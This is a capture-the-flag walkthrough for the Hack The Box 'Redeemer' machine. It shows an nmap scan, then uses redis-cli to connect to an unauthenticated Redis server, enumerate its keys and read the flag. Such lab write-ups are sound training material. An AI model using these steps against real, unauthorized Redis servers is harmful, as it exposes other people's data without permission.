# Hack The Box — Redeemer Walkthrough

## 📌 Machine Info
- **Name:** Redeemer
- **Difficulty:** Very Easy
- **Category:** Misconfiguration / Redis

---

## 1️⃣ Reconnaissance (Nmap)
First, scan the target to identify open ports and services:

```bash
nmap -sC -sV -Pn <TARGET_IP>
```

### Result:
```text
6379/tcp open  redis
```

This shows that **Redis service is exposed on port 6379**.

---

## 2️⃣ Redis Client Setup (redis-cli)
Before connecting, ensure that the Redis client is installed on the attacker machine.

Install redis-cli (if not already installed):

```bash
sudo apt update
sudo apt install redis-tools -y
```

Verify installation:

```bash
redis-cli --version
```

---

## 3️⃣ Redis Enumeration
Redis is often misconfigured and may not require authentication.

Connect to Redis:

```bash
redis-cli -h <TARGET_IP> -p 6379
```

Check if the service responds:

```text
PING
```

Expected output:
```text
PONG
```

---

## 3️⃣ Database Enumeration
Check Redis information:

```text
INFO
```

Select database 0 (default):

```text
SELECT 0
```

List all keys stored in Redis:

```text
KEYS *
```

---

## 4️⃣ Flag Retrieval
After identifying the flag key, retrieve its value:

```text
GET flag
```

This command reveals the **flag**, completing the machine.

---

## 🧠 Key Takeaways
- Redis was exposed **without authentication**
- Misconfigured services can lead to sensitive data exposure
- Always check for Redis on port **6379** during enumeration

---

## ✅ Machine Status
🏁 **Redeemer — Completed Successfully**

